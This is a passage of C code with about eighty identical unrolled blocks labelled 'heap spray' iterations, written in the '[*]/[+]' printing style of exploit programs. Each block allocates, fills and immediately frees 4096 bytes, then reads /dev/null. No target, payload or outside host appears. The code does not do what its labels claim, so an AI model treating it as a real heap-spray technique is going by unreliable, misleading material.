        close(fd145);
    }
    // Iteration 147
    printf("[*] Heap spray iteration 147\\n");
    void *ptr146 = malloc(4096);
    if (ptr146) {
        memset(ptr146, 0x41, 4096);
        printf("[+] Allocated ptr146\\n");
        free(ptr146);
    }
    int fd146 = open("/dev/null", O_RDONLY);
    if (fd146 >= 0) {
        char buf146[256];
        read(fd146, buf146, sizeof(buf146));
        close(fd146);
    }
    // Iteration 148
    printf("[*] Heap spray iteration 148\\n");
    void *ptr147 = malloc(4096);
    if (ptr147) {
        memset(ptr147, 0x41, 4096);
        printf("[+] Allocated ptr147\\n");
        free(ptr147);
    }
    int fd147 = open("/dev/null", O_RDONLY);
    if (fd147 >= 0) {
        char buf147[256];
        read(fd147, buf147, sizeof(buf147));
        close(fd147);
    }
    // Iteration 149
    printf("[*] Heap spray iteration 149\\n");
    void *ptr148 = malloc(4096);
    if (ptr148) {
        memset(ptr148, 0x41, 4096);
        printf("[+] Allocated ptr148\\n");
        free(ptr148);
    }
    int fd148 = open("/dev/null", O_RDONLY);
    if (fd148 >= 0) {
        char buf148[256];
        read(fd148, buf148, sizeof(buf148));
        close(fd148);
    }
    // Iteration 150
    printf("[*] Heap spray iteration 150\\n");
    void *ptr149 = malloc(4096);
    if (ptr149) {
        memset(ptr149, 0x41, 4096);
        printf("[+] Allocated ptr149\\n");
        free(ptr149);
    }
    int fd149 = open("/dev/null", O_RDONLY);
    if (fd149 >= 0) {
        char buf149[256];
        read(fd149, buf149, sizeof(buf149));
        close(fd149);
    }
    // Iteration 151
    printf("[*] Heap spray iteration 151\\n");
    void *ptr150 = malloc(4096);
    if (ptr150) {
        memset(ptr150, 0x41, 4096);
        printf("[+] Allocated ptr150\\n");
        free(ptr150);
    }
    int fd150 = open("/dev/null", O_RDONLY);
    if (fd150 >= 0) {
        char buf150[256];
        read(fd150, buf150, sizeof(buf150));
        close(fd150);
    }
    // Iteration 152
    printf("[*] Heap spray iteration 152\\n");
    void *ptr151 = malloc(4096);
    if (ptr151) {
        memset(ptr151, 0x41, 4096);
        printf("[+] Allocated ptr151\\n");
        free(ptr151);
    }
    int fd151 = open("/dev/null", O_RDONLY);
    if (fd151 >= 0) {
        char buf151[256];
        read(fd151, buf151, sizeof(buf151));
        close(fd151);
    }
    // Iteration 153
    printf("[*] Heap spray iteration 153\\n");
    void *ptr152 = malloc(4096);
    if (ptr152) {
        memset(ptr152, 0x41, 4096);
        printf("[+] Allocated ptr152\\n");
        free(ptr152);
    }
    int fd152 = open("/dev/null", O_RDONLY);
    if (fd152 >= 0) {
        char buf152[256];
        read(fd152, buf152, sizeof(buf152));
        close(fd152);
    }
    // Iteration 154
    printf("[*] Heap spray iteration 154\\n");
    void *ptr153 = malloc(4096);
    if (ptr153) {
        memset(ptr153, 0x41, 4096);
        printf("[+] Allocated ptr153\\n");
        free(ptr153);
    }
    int fd153 = open("/dev/null", O_RDONLY);
    if (fd153 >= 0) {
        char buf153[256];
        read(fd153, buf153, sizeof(buf153));
        close(fd153);
    }
    // Iteration 155
    printf("[*] Heap spray iteration 155\\n");
    void *ptr154 = malloc(4096);
    if (ptr154) {
        memset(ptr154, 0x41, 4096);
        printf("[+] Allocated ptr154\\n");
        free(ptr154);
    }
    int fd154 = open("/dev/null", O_RDONLY);
    if (fd154 >= 0) {
        char buf154[256];
        read(fd154, buf154, sizeof(buf154));
        close(fd154);
    }
    // Iteration 156
    printf("[*] Heap spray iteration 156\\n");
    void *ptr155 = malloc(4096);
    if (ptr155) {
        memset(ptr155, 0x41, 4096);
        printf("[+] Allocated ptr155\\n");
        free(ptr155);
    }
    int fd155 = open("/dev/null", O_RDONLY);
    if (fd155 >= 0) {
        char buf155[256];
        read(fd155, buf155, sizeof(buf155));
        close(fd155);
    }
    // Iteration 157
    printf("[*] Heap spray iteration 157\\n");
    void *ptr156 = malloc(4096);
    if (ptr156) {
        memset(ptr156, 0x41, 4096);
        printf("[+] Allocated ptr156\\n");
        free(ptr156);
    }
    int fd156 = open("/dev/null", O_RDONLY);
    if (fd156 >= 0) {
        char buf156[256];
        read(fd156, buf156, sizeof(buf156));
        close(fd156);
    }
    // Iteration 158
    printf("[*] Heap spray iteration 158\\n");
    void *ptr157 = malloc(4096);
    if (ptr157) {
        memset(ptr157, 0x41, 4096);
        printf("[+] Allocated ptr157\\n");
        free(ptr157);
    }
    int fd157 = open("/dev/null", O_RDONLY);
    if (fd157 >= 0) {
        char buf157[256];
        read(fd157, buf157, sizeof(buf157));
        close(fd157);
    }
    // Iteration 159
    printf("[*] Heap spray iteration 159\\n");
    void *ptr158 = malloc(4096);
    if (ptr158) {
        memset(ptr158, 0x41, 4096);
        printf("[+] Allocated ptr158\\n");
        free(ptr158);
    }
    int fd158 = open("/dev/null", O_RDONLY);
    if (fd158 >= 0) {
        char buf158[256];
        read(fd158, buf158, sizeof(buf158));
        close(fd158);
    }
    // Iteration 160
    printf("[*] Heap spray iteration 160\\n");
    void *ptr159 = malloc(4096);
    if (ptr159) {
        memset(ptr159, 0x41, 4096);
        printf("[+] Allocated ptr159\\n");
        free(ptr159);
    }
    int fd159 = open("/dev/null", O_RDONLY);
    if (fd159 >= 0) {
        char buf159[256];
        read(fd159, buf159, sizeof(buf159));
        close(fd159);
    }
    // Iteration 161
    printf("[*] Heap spray iteration 161\\n");
    void *ptr160 = malloc(4096);
    if (ptr160) {
        memset(ptr160, 0x41, 4096);
        printf("[+] Allocated ptr160\\n");
        free(ptr160);
    }
    int fd160 = open("/dev/null", O_RDONLY);
    if (fd160 >= 0) {
        char buf160[256];
        read(fd160, buf160, sizeof(buf160));
        close(fd160);
    }
    // Iteration 162
    printf("[*] Heap spray iteration 162\\n");
    void *ptr161 = malloc(4096);
    if (ptr161) {
        memset(ptr161, 0x41, 4096);
        printf("[+] Allocated ptr161\\n");
        free(ptr161);
    }
    int fd161 = open("/dev/null", O_RDONLY);
    if (fd161 >= 0) {
        char buf161[256];
        read(fd161, buf161, sizeof(buf161));
        close(fd161);
    }
    // Iteration 163
    printf("[*] Heap spray iteration 163\\n");
    void *ptr162 = malloc(4096);
    if (ptr162) {
        memset(ptr162, 0x41, 4096);
        printf("[+] Allocated ptr162\\n");
        free(ptr162);
    }
    int fd162 = open("/dev/null", O_RDONLY);
    if (fd162 >= 0) {
        char buf162[256];
        read(fd162, buf162, sizeof(buf162));
        close(fd162);
    }
    // Iteration 164
    printf("[*] Heap spray iteration 164\\n");
    void *ptr163 = malloc(4096);
    if (ptr163) {
        memset(ptr163, 0x41, 4096);
        printf("[+] Allocated ptr163\\n");
        free(ptr163);
    }
    int fd163 = open("/dev/null", O_RDONLY);
    if (fd163 >= 0) {
        char buf163[256];
        read(fd163, buf163, sizeof(buf163));
        close(fd163);
    }
    // Iteration 165
    printf("[*] Heap spray iteration 165\\n");
    void *ptr164 = malloc(4096);
    if (ptr164) {
        memset(ptr164, 0x41, 4096);
        printf("[+] Allocated ptr164\\n");
        free(ptr164);
    }
    int fd164 = open("/dev/null", O_RDONLY);
    if (fd164 >= 0) {
        char buf164[256];
        read(fd164, buf164, sizeof(buf164));
        close(fd164);
    }
    // Iteration 166
    printf("[*] Heap spray iteration 166\\n");
    void *ptr165 = malloc(4096);
    if (ptr165) {
        memset(ptr165, 0x41, 4096);
        printf("[+] Allocated ptr165\\n");
        free(ptr165);
    }
    int fd165 = open("/dev/null", O_RDONLY);
    if (fd165 >= 0) {
        char buf165[256];
        read(fd165, buf165, sizeof(buf165));
        close(fd165);
    }
    // Iteration 167
    printf("[*] Heap spray iteration 167\\n");
    void *ptr166 = malloc(4096);
    if (ptr166) {
        memset(ptr166, 0x41, 4096);
        printf("[+] Allocated ptr166\\n");
        free(ptr166);
    }
    int fd166 = open("/dev/null", O_RDONLY);
    if (fd166 >= 0) {
        char buf166[256];
        read(fd166, buf166, sizeof(buf166));
        close(fd166);
    }
    // Iteration 168
    printf("[*] Heap spray iteration 168\\n");
    void *ptr167 = malloc(4096);
    if (ptr167) {
        memset(ptr167, 0x41, 4096);
        printf("[+] Allocated ptr167\\n");
        free(ptr167);
    }
    int fd167 = open("/dev/null", O_RDONLY);
    if (fd167 >= 0) {
        char buf167[256];
        read(fd167, buf167, sizeof(buf167));
        close(fd167);
    }
    // Iteration 169
    printf("[*] Heap spray iteration 169\\n");
    void *ptr168 = malloc(4096);
    if (ptr168) {
        memset(ptr168, 0x41, 4096);
        printf("[+] Allocated ptr168\\n");
        free(ptr168);
    }
    int fd168 = open("/dev/null", O_RDONLY);
    if (fd168 >= 0) {
        char buf168[256];
        read(fd168, buf168, sizeof(buf168));
        close(fd168);
    }
    // Iteration 170
    printf("[*] Heap spray iteration 170\\n");
    void *ptr169 = malloc(4096);
    if (ptr169) {
        memset(ptr169, 0x41, 4096);
        printf("[+] Allocated ptr169\\n");
        free(ptr169);
    }
    int fd169 = open("/dev/null", O_RDONLY);
    if (fd169 >= 0) {
        char buf169[256];
        read(fd169, buf169, sizeof(buf169));
        close(fd169);
    }
    // Iteration 171
    printf("[*] Heap spray iteration 171\\n");
    void *ptr170 = malloc(4096);
    if (ptr170) {
        memset(ptr170, 0x41, 4096);
        printf("[+] Allocated ptr170\\n");
        free(ptr170);
    }
    int fd170 = open("/dev/null", O_RDONLY);
    if (fd170 >= 0) {
        char buf170[256];
        read(fd170, buf170, sizeof(buf170));
        close(fd170);
    }
    // Iteration 172
    printf("[*] Heap spray iteration 172\\n");
    void *ptr171 = malloc(4096);
    if (ptr171) {
        memset(ptr171, 0x41, 4096);
        printf("[+] Allocated ptr171\\n");
        free(ptr171);
    }
    int fd171 = open("/dev/null", O_RDONLY);
    if (fd171 >= 0) {
        char buf171[256];
        read(fd171, buf171, sizeof(buf171));
        close(fd171);
    }
    // Iteration 173
    printf("[*] Heap spray iteration 173\\n");
    void *ptr172 = malloc(4096);
    if (ptr172) {
        memset(ptr172, 0x41, 4096);
        printf("[+] Allocated ptr172\\n");
        free(ptr172);
    }
    int fd172 = open("/dev/null", O_RDONLY);
    if (fd172 >= 0) {
        char buf172[256];
        read(fd172, buf172, sizeof(buf172));
        close(fd172);
    }
    // Iteration 174
    printf("[*] Heap spray iteration 174\\n");
    void *ptr173 = malloc(4096);
    if (ptr173) {
        memset(ptr173, 0x41, 4096);
        printf("[+] Allocated ptr173\\n");
        free(ptr173);
    }
    int fd173 = open("/dev/null", O_RDONLY);
    if (fd173 >= 0) {
        char buf173[256];
        read(fd173, buf173, sizeof(buf173));
        close(fd173);
    }
    // Iteration 175
    printf("[*] Heap spray iteration 175\\n");
    void *ptr174 = malloc(4096);
    if (ptr174) {
        memset(ptr174, 0x41, 4096);
        printf("[+] Allocated ptr174\\n");
        free(ptr174);
    }
    int fd174 = open("/dev/null", O_RDONLY);
    if (fd174 >= 0) {
        char buf174[256];
        read(fd174, buf174, sizeof(buf174));
        close(fd174);
    }
    // Iteration 176
    printf("[*] Heap spray iteration 176\\n");
    void *ptr175 = malloc(4096);
    if (ptr175) {
        memset(ptr175, 0x41, 4096);
        printf("[+] Allocated ptr175\\n");
        free(ptr175);
    }
    int fd175 = open("/dev/null", O_RDONLY);
    if (fd175 >= 0) {
        char buf175[256];
        read(fd175, buf175, sizeof(buf175));
        close(fd175);
    }
    // Iteration 177
    printf("[*] Heap spray iteration 177\\n");
    void *ptr176 = malloc(4096);
    if (ptr176) {
        memset(ptr176, 0x41, 4096);
        printf("[+] Allocated ptr176\\n");
        free(ptr176);
    }
    int fd176 = open("/dev/null", O_RDONLY);
    if (fd176 >= 0) {
        char buf176[256];
        read(fd176, buf176, sizeof(buf176));
        close(fd176);
    }
    // Iteration 178
    printf("[*] Heap spray iteration 178\\n");
    void *ptr177 = malloc(4096);
    if (ptr177) {
        memset(ptr177, 0x41, 4096);
        printf("[+] Allocated ptr177\\n");
        free(ptr177);
    }
    int fd177 = open("/dev/null", O_RDONLY);
    if (fd177 >= 0) {
        char buf177[256];
        read(fd177, buf177, sizeof(buf177));
        close(fd177);
    }
    // Iteration 179
    printf("[*] Heap spray iteration 179\\n");
    void *ptr178 = malloc(4096);
    if (ptr178) {
        memset(ptr178, 0x41, 4096);
        printf("[+] Allocated ptr178\\n");
        free(ptr178);
    }
    int fd178 = open("/dev/null", O_RDONLY);
    if (fd178 >= 0) {
        char buf178[256];
        read(fd178, buf178, sizeof(buf178));
        close(fd178);
    }
    // Iteration 180
    printf("[*] Heap spray iteration 180\\n");
    void *ptr179 = malloc(4096);
    if (ptr179) {
        memset(ptr179, 0x41, 4096);
        printf("[+] Allocated ptr179\\n");
        free(ptr179);
    }
    int fd179 = open("/dev/null", O_RDONLY);
    if (fd179 >= 0) {
        char buf179[256];
        read(fd179, buf179, sizeof(buf179));
        close(fd179);
    }
    // Iteration 181
    printf("[*] Heap spray iteration 181\\n");
    void *ptr180 = malloc(4096);
    if (ptr180) {
        memset(ptr180, 0x41, 4096);
        printf("[+] Allocated ptr180\\n");
        free(ptr180);
    }
    int fd180 = open("/dev/null", O_RDONLY);
    if (fd180 >= 0) {
        char buf180[256];
        read(fd180, buf180, sizeof(buf180));
        close(fd180);
    }
    // Iteration 182
    printf("[*] Heap spray iteration 182\\n");
    void *ptr181 = malloc(4096);
    if (ptr181) {
        memset(ptr181, 0x41, 4096);
        printf("[+] Allocated ptr181\\n");
        free(ptr181);
    }
    int fd181 = open("/dev/null", O_RDONLY);
    if (fd181 >= 0) {
        char buf181[256];
        read(fd181, buf181, sizeof(buf181));
        close(fd181);
    }
    // Iteration 183
    printf("[*] Heap spray iteration 183\\n");
    void *ptr182 = malloc(4096);
    if (ptr182) {
        memset(ptr182, 0x41, 4096);
        printf("[+] Allocated ptr182\\n");
        free(ptr182);
    }
    int fd182 = open("/dev/null", O_RDONLY);
    if (fd182 >= 0) {
        char buf182[256];
        read(fd182, buf182, sizeof(buf182));
        close(fd182);
    }
    // Iteration 184
    printf("[*] Heap spray iteration 184\\n");
    void *ptr183 = malloc(4096);
    if (ptr183) {
        memset(ptr183, 0x41, 4096);
        printf("[+] Allocated ptr183\\n");
        free(ptr183);
    }
    int fd183 = open("/dev/null", O_RDONLY);
    if (fd183 >= 0) {
        char buf183[256];
        read(fd183, buf183, sizeof(buf183));
        close(fd183);
    }
    // Iteration 185
    printf("[*] Heap spray iteration 185\\n");
    void *ptr184 = malloc(4096);
    if (ptr184) {
        memset(ptr184, 0x41, 4096);
        printf("[+] Allocated ptr184\\n");
        free(ptr184);
    }
    int fd184 = open("/dev/null", O_RDONLY);
    if (fd184 >= 0) {
        char buf184[256];
        read(fd184, buf184, sizeof(buf184));
        close(fd184);
    }
    // Iteration 186
    printf("[*] Heap spray iteration 186\\n");
    void *ptr185 = malloc(4096);
    if (ptr185) {
        memset(ptr185, 0x41, 4096);
        printf("[+] Allocated ptr185\\n");
        free(ptr185);
    }
    int fd185 = open("/dev/null", O_RDONLY);
    if (fd185 >= 0) {
        char buf185[256];
        read(fd185, buf185, sizeof(buf185));
        close(fd185);
    }
    // Iteration 187
    printf("[*] Heap spray iteration 187\\n");
    void *ptr186 = malloc(4096);
    if (ptr186) {
        memset(ptr186, 0x41, 4096);
        printf("[+] Allocated ptr186\\n");
        free(ptr186);
    }
    int fd186 = open("/dev/null", O_RDONLY);
    if (fd186 >= 0) {
        char buf186[256];
        read(fd186, buf186, sizeof(buf186));
        close(fd186);
    }
    // Iteration 188
    printf("[*] Heap spray iteration 188\\n");
    void *ptr187 = malloc(4096);
    if (ptr187) {
        memset(ptr187, 0x41, 4096);
        printf("[+] Allocated ptr187\\n");
        free(ptr187);
    }
    int fd187 = open("/dev/null", O_RDONLY);
    if (fd187 >= 0) {
        char buf187[256];
        read(fd187, buf187, sizeof(buf187));
        close(fd187);
    }
    // Iteration 189
    printf("[*] Heap spray iteration 189\\n");
    void *ptr188 = malloc(4096);
    if (ptr188) {
        memset(ptr188, 0x41, 4096);
        printf("[+] Allocated ptr188\\n");
        free(ptr188);
    }
    int fd188 = open("/dev/null", O_RDONLY);
    if (fd188 >= 0) {
        char buf188[256];
        read(fd188, buf188, sizeof(buf188));
        close(fd188);
    }
    // Iteration 190
    printf("[*] Heap spray iteration 190\\n");
    void *ptr189 = malloc(4096);
    if (ptr189) {
        memset(ptr189, 0x41, 4096);
        printf("[+] Allocated ptr189\\n");
        free(ptr189);
    }
    int fd189 = open("/dev/null", O_RDONLY);
    if (fd189 >= 0) {
        char buf189[256];
        read(fd189, buf189, sizeof(buf189));
        close(fd189);
    }
    // Iteration 191
    printf("[*] Heap spray iteration 191\\n");
    void *ptr190 = malloc(4096);
    if (ptr190) {
        memset(ptr190, 0x41, 4096);
        printf("[+] Allocated ptr190\\n");
        free(ptr190);
    }
    int fd190 = open("/dev/null", O_RDONLY);
    if (fd190 >= 0) {
        char buf190[256];
        read(fd190, buf190, sizeof(buf190));
        close(fd190);
    }
    // Iteration 192
    printf("[*] Heap spray iteration 192\\n");
    void *ptr191 = malloc(4096);
    if (ptr191) {
        memset(ptr191, 0x41, 4096);
        printf("[+] Allocated ptr191\\n");
        free(ptr191);
    }
    int fd191 = open("/dev/null", O_RDONLY);
    if (fd191 >= 0) {
        char buf191[256];
        read(fd191, buf191, sizeof(buf191));
        close(fd191);
    }
    // Iteration 193
    printf("[*] Heap spray iteration 193\\n");
    void *ptr192 = malloc(4096);
    if (ptr192) {
        memset(ptr192, 0x41, 4096);
        printf("[+] Allocated ptr192\\n");
        free(ptr192);
    }
    int fd192 = open("/dev/null", O_RDONLY);
    if (fd192 >= 0) {
        char buf192[256];
        read(fd192, buf192, sizeof(buf192));
        close(fd192);
    }
    // Iteration 194
    printf("[*] Heap spray iteration 194\\n");
    void *ptr193 = malloc(4096);
    if (ptr193) {
        memset(ptr193, 0x41, 4096);
        printf("[+] Allocated ptr193\\n");
        free(ptr193);
    }
    int fd193 = open("/dev/null", O_RDONLY);
    if (fd193 >= 0) {
        char buf193[256];
        read(fd193, buf193, sizeof(buf193));
        close(fd193);
    }
    // Iteration 195
    printf("[*] Heap spray iteration 195\\n");
    void *ptr194 = malloc(4096);
    if (ptr194) {
        memset(ptr194, 0x41, 4096);
        printf("[+] Allocated ptr194\\n");
        free(ptr194);
    }
    int fd194 = open("/dev/null", O_RDONLY);
    if (fd194 >= 0) {
        char buf194[256];
        read(fd194, buf194, sizeof(buf194));
        close(fd194);
    }
    // Iteration 196
    printf("[*] Heap spray iteration 196\\n");
    void *ptr195 = malloc(4096);
    if (ptr195) {
        memset(ptr195, 0x41, 4096);
        printf("[+] Allocated ptr195\\n");
        free(ptr195);
    }
    int fd195 = open("/dev/null", O_RDONLY);
    if (fd195 >= 0) {
        char buf195[256];
        read(fd195, buf195, sizeof(buf195));
        close(fd195);
    }
    // Iteration 197
    printf("[*] Heap spray iteration 197\\n");
    void *ptr196 = malloc(4096);
    if (ptr196) {
        memset(ptr196, 0x41, 4096);
        printf("[+] Allocated ptr196\\n");
        free(ptr196);
    }
    int fd196 = open("/dev/null", O_RDONLY);
    if (fd196 >= 0) {
        char buf196[256];
        read(fd196, buf196, sizeof(buf196));
        close(fd196);
    }
    // Iteration 198
    printf("[*] Heap spray iteration 198\\n");
    void *ptr197 = malloc(4096);
    if (ptr197) {
        memset(ptr197, 0x41, 4096);
        printf("[+] Allocated ptr197\\n");
        free(ptr197);
    }
    int fd197 = open("/dev/null", O_RDONLY);
    if (fd197 >= 0) {
        char buf197[256];
        read(fd197, buf197, sizeof(buf197));
        close(fd197);
    }
    // Iteration 199
    printf("[*] Heap spray iteration 199\\n");
    void *ptr198 = malloc(4096);
    if (ptr198) {
        memset(ptr198, 0x41, 4096);
        printf("[+] Allocated ptr198\\n");
        free(ptr198);
    }
    int fd198 = open("/dev/null", O_RDONLY);
    if (fd198 >= 0) {
        char buf198[256];
        read(fd198, buf198, sizeof(buf198));
        close(fd198);
    }
    // Iteration 200
    printf("[*] Heap spray iteration 200\\n");
    void *ptr199 = malloc(4096);
    if (ptr199) {
        memset(ptr199, 0x41, 4096);
        printf("[+] Allocated ptr199\\n");
        free(ptr199);
    }
    int fd199 = open("/dev/null", O_RDONLY);
    if (fd199 >= 0) {
        char buf199[256];
        read(fd199, buf199, sizeof(buf199));
        close(fd199);
    }
    // Iteration 201
    printf("[*] Heap spray iteration 201\\n");
    void *ptr200 = malloc(4096);
    if (ptr200) {
        memset(ptr200, 0x41, 4096);
        printf("[+] Allocated ptr200\\n");
        free(ptr200);
    }
    int fd200 = open("/dev/null", O_RDONLY);
    if (fd200 >= 0) {
        char buf200[256];
        read(fd200, buf200, sizeof(buf200));
        close(fd200);
    }
    // Iteration 202
    printf("[*] Heap spray iteration 202\\n");
    void *ptr201 = malloc(4096);
    if (ptr201) {
        memset(ptr201, 0x41, 4096);
        printf("[+] Allocated ptr201\\n");
        free(ptr201);
    }
    int fd201 = open("/dev/null", O_RDONLY);
    if (fd201 >= 0) {
        char buf201[256];
        read(fd201, buf201, sizeof(buf201));
        close(fd201);
    }
    // Iteration 203
    printf("[*] Heap spray iteration 203\\n");
    void *ptr202 = malloc(4096);
    if (ptr202) {
        memset(ptr202, 0x41, 4096);
        printf("[+] Allocated ptr202\\n");
        free(ptr202);
    }
    int fd202 = open("/dev/null", O_RDONLY);
    if (fd202 >= 0) {
        char buf202[256];
        read(fd202, buf202, sizeof(buf202));
        close(fd202);
    }
    // Iteration 204
    printf("[*] Heap spray iteration 204\\n");
    void *ptr203 = malloc(4096);
    if (ptr203) {
        memset(ptr203, 0x41, 4096);
        printf("[+] Allocated ptr203\\n");
        free(ptr203);
    }
    int fd203 = open("/dev/null", O_RDONLY);
    if (fd203 >= 0) {
        char buf203[256];
        read(fd203, buf203, sizeof(buf203));
        close(fd203);
    }
    // Iteration 205
    printf("[*] Heap spray iteration 205\\n");
    void *ptr204 = malloc(4096);
    if (ptr204) {
        memset(ptr204, 0x41, 4096);
        printf("[+] Allocated ptr204\\n");
        free(ptr204);
    }
    int fd204 = open("/dev/null", O_RDONLY);
    if (fd204 >= 0) {
        char buf204[256];
        read(fd204, buf204, sizeof(buf204));
        close(fd204);
    }
    // Iteration 206
    printf("[*] Heap spray iteration 206\\n");
    void *ptr205 = malloc(4096);
    if (ptr205) {
        memset(ptr205, 0x41, 4096);
        printf("[+] Allocated ptr205\\n");
        free(ptr205);
    }
    int fd205 = open("/dev/null", O_RDONLY);
    if (fd205 >= 0) {
        char buf205[256];
        read(fd205, buf205, sizeof(buf205));
        close(fd205);
    }
    // Iteration 207
    printf("[*] Heap spray iteration 207\\n");
    void *ptr206 = malloc(4096);
    if (ptr206) {
        memset(ptr206, 0x41, 4096);
        printf("[+] Allocated ptr206\\n");
        free(ptr206);
    }
    int fd206 = open("/dev/null", O_RDONLY);
    if (fd206 >= 0) {
        char buf206[256];
        read(fd206, buf206, sizeof(buf206));
        close(fd206);
    }
    // Iteration 208
    printf("[*] Heap spray iteration 208\\n");
    void *ptr207 = malloc(4096);
    if (ptr207) {
        memset(ptr207, 0x41, 4096);
        printf("[+] Allocated ptr207\\n");
        free(ptr207);
    }
    int fd207 = open("/dev/null", O_RDONLY);
    if (fd207 >= 0) {
        char buf207[256];
        read(fd207, buf207, sizeof(buf207));
        close(fd207);
    }
    // Iteration 209
    printf("[*] Heap spray iteration 209\\n");
    void *ptr208 = malloc(4096);
    if (ptr208) {
        memset(ptr208, 0x41, 4096);
        printf("[+] Allocated ptr208\\n");
        free(ptr208);
    }
    int fd208 = open("/dev/null", O_RDONLY);
    if (fd208 >= 0) {
        char buf208[256];
        read(fd208, buf208, sizeof(buf208));
        close(fd208);
    }
    // Iteration 210
    printf("[*] Heap spray iteration 210\\n");
    void *ptr209 = malloc(4096);
    if (ptr209) {
        memset(ptr209, 0x41, 4096);
        printf("[+] Allocated ptr209\\n");
        free(ptr209);
    }
    int fd209 = open("/dev/null", O_RDONLY);
    if (fd209 >= 0) {
        char buf209[256];
        read(fd209, buf209, sizeof(buf209));
        close(fd209);
    }
    // Iteration 211
    printf("[*] Heap spray iteration 211\\n");
    void *ptr210 = malloc(4096);
    if (ptr210) {
        memset(ptr210, 0x41, 4096);
        printf("[+] Allocated ptr210\\n");
        free(ptr210);
    }
    int fd210 = open("/dev/null", O_RDONLY);
    if (fd210 >= 0) {
        char buf210[256];
        read(fd210, buf210, sizeof(buf210));
        close(fd210);
    }
    // Iteration 212
    printf("[*] Heap spray iteration 212\\n");
    void *ptr211 = malloc(4096);
    if (ptr211) {
        memset(ptr211, 0x41, 4096);
        printf("[+] Allocated ptr211\\n");
        free(ptr211);
    }
    int fd211 = open("/dev/null", O_RDONLY);
    if (fd211 >= 0) {
        char buf211[256];
        read(fd211, buf211, sizeof(buf211));
        close(fd211);
    }
    // Iteration 213
    printf("[*] Heap spray iteration 213\\n");
    void *ptr212 = malloc(4096);
    if (ptr212) {
        memset(ptr212, 0x41, 4096);
        printf("[+] Allocated ptr212\\n");
        free(ptr212);
    }
    int fd212 = open("/dev/null", O_RDONLY);
    if (fd212 >= 0) {
        char buf212[256];
        read(fd212, buf212, sizeof(buf212));
        close(fd212);
    }
    // Iteration 214
    printf("[*] Heap spray iteration 214\\n");
    void *ptr213 = malloc(4096);
    if (ptr213) {
        memset(ptr213, 0x41, 4096);
        printf("[+] Allocated ptr213\\n");
        free(ptr213);
    }
    int fd213 = open("/dev/null", O_RDONLY);
    if (fd213 >= 0) {
        char buf213[256];
        read(fd213, buf213, sizeof(buf213));
        close(fd213);
    }
    // Iteration 215
    printf("[*] Heap spray iteration 215\\n");
    void *ptr214 = malloc(4096);
    if (ptr214) {
        memset(ptr214, 0x41, 4096);
        printf("[+] Allocated ptr214\\n");
        free(ptr214);
    }
    int fd214 = open("/dev/null", O_RDONLY);
    if (fd214 >= 0) {
        char buf214[256];
        read(fd214, buf214, sizeof(buf214));
        close(fd214);
    }
    // Iteration 216
    printf("[*] Heap spray iteration 216\\n");
    void *ptr215 = malloc(4096);
    if (ptr215) {
        memset(ptr215, 0x41, 4096);
        printf("[+] Allocated ptr215\\n");
        free(ptr215);
    }
    int fd215 = open("/dev/null", O_RDONLY);
    if (fd215 >= 0) {
        char buf215[256];
        read(fd215, buf215, sizeof(buf215));
        close(fd215);
    }
    // Iteration 217
    printf("[*] Heap spray iteration 217\\n");
    void *ptr216 = malloc(4096);
    if (ptr216) {
        memset(ptr216, 0x41, 4096);
        printf("[+] Allocated ptr216\\n");
        free(ptr216);
    }
    int fd216 = open("/dev/null", O_RDONLY);
    if (fd216 >= 0) {
        char buf216[256];
        read(fd216, buf216, sizeof(buf216));
        close(fd216);
    }
    // Iteration 218
    printf("[*] Heap spray iteration 218\\n");
    void *ptr217 = malloc(4096);
    if (ptr217) {
        memset(ptr217, 0x41, 4096);
        printf("[+] Allocated ptr217\\n");
        free(ptr217);
    }
    int fd217 = open("/dev/null", O_RDONLY);
    if (fd217 >= 0) {
        char buf217[256];
        read(fd217, buf217, sizeof(buf217));
        close(fd217);
    }
    // Iteration 219
    printf("[*] Heap spray iteration 219\\n");
    void *ptr218 = malloc(4096);
    if (ptr218) {
        memset(ptr218, 0x41, 4096);
        printf("[+] Allocated ptr218\\n");
        free(ptr218);
    }
    int fd218 = open("/dev/null", O_RDONLY);
    if (fd218 >= 0) {
        char buf218[256];
        read(fd218, buf218, sizeof(buf218));
        close(fd218);
    }
    // Iteration 220
    printf("[*] Heap spray iteration 220\\n");
    void *ptr219 = malloc(4096);
    if (ptr219) {
        memset(ptr219, 0x41, 4096);
        printf("[+] Allocated ptr219\\n");
        free(ptr219);
    }
    int fd219 = open("/dev/null", O_RDONLY);
    if (fd219 >= 0) {
        char buf219[256];
        read(fd219, buf219, sizeof(buf219));
        close(fd219);
    }
    // Iteration 221
    printf("[*] Heap spray iteration 221\\n");
    void *ptr220 = malloc(4096);
    if (ptr220) {
        memset(ptr220, 0x41, 4096);
        printf("[+] Allocated ptr220\\n");
        free(ptr220);
    }
    int fd220 = open("/dev/null", O_RDONLY);
    if (fd220 >= 0) {
        char buf220[256];
        read(fd220, buf220, sizeof(buf220));
        close(fd220);
    }
    // Iteration 222
    printf("[*] Heap spray iteration 222\\n");
    void *ptr221 = malloc(4096);
    if (ptr221) {
        memset(ptr221, 0x41, 4096);
        printf("[+] Allocated ptr221\\n");
        free(ptr221);
    }
    int fd221 = open("/dev/null", O_RDONLY);
    if (fd221 >= 0) {
        char buf221[256];
        read(fd221, buf221, sizeof(buf221));
        close(fd221);
    }
    // Iteration 223
    printf("[*] Heap spray iteration 223\\n");
    void *ptr222 = malloc(4096);
    if (ptr222) {
        memset(ptr222, 0x41, 4096);
        printf("[+] Allocated ptr222\\n");
        free(ptr222);
    }
    int fd222 = open("/dev/null", O_RDONLY);
    if (fd222 >= 0) {
        char buf222[256];
        read(fd222, buf222, sizeof(buf222));
        close(fd222);
    }
    // Iteration 224
    printf("[*] Heap spray iteration 224\\n");
    void *ptr223 = malloc(4096);
    if (ptr223) {
        memset(ptr223, 0x41, 4096);
        printf("[+] Allocated ptr223\\n");
        free(ptr223);
    }
    int fd223 = open("/dev/null", O_RDONLY);
    if (fd223 >= 0) {
        char buf223[256];
        read(fd223, buf223, sizeof(buf223));
        close(fd223);
    }
    // Iteration 225
    printf("[*] Heap spray iteration 225\\n");
    void *ptr224 = malloc(4096);
    if (ptr224) {
        memset(ptr224, 0x41, 4096);
        printf("[+] Allocated ptr224\\n");
        free(ptr224);
    }
    int fd224 = open("/dev/null", O_RDONLY);
    if (fd224 >= 0) {
        char buf224[256];
        read(fd224, buf224, sizeof(buf224));
        close(fd224);
    }
    // Iteration 226
    printf("[*] Heap spray iteration 226\\n");
    void *ptr225 = malloc(4096);
    if (ptr225) {
        memset(ptr225, 0x41, 4096);
        printf("[+] Allocated ptr225\\n");
        free(ptr225);
    }
    int fd225 = open("/dev/null", O_RDONLY);
